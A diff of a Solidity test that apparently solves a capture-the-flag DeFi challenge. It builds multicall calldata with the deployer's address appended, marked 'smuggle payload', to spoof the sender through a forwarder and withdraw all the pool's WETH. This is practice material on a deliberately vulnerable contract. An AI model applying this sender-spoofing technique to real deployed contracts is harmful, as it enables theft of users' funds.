@@ -89,15 +89,18 @@ contract NaiveReceiverChallenge is Test {
             );
         }
 
+        // NOTE: encodeCall = proper calldata 
+        //       encodePacked = only combine bytes 
         // exp: 00f714ce [amount padded 32B] [recovery padded 32B] [deployer padded 32B]
         // actual call data: 4 (from NaiveRecieverPool.withdraw) + 32 + 32 + 32 (from encodePacked (deployer bytes32)) = 100 bytes
         callDatas[10] = abi.encodePacked(
             abi.encodeCall(
                 NaiveReceiverPool.withdraw, 
                 (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
-            bytes32(uint256(uint160(deployer)))
+            bytes32(uint256(uint160(deployer))) // smuggle payload
         );
-        bytes memory callData;
+        
+        bytes memory callData; 
         callData = abi.encodeCall(pool.multicall, callDatas);
         BasicForwarder.Request memory request = BasicForwarder.Request(
             player,
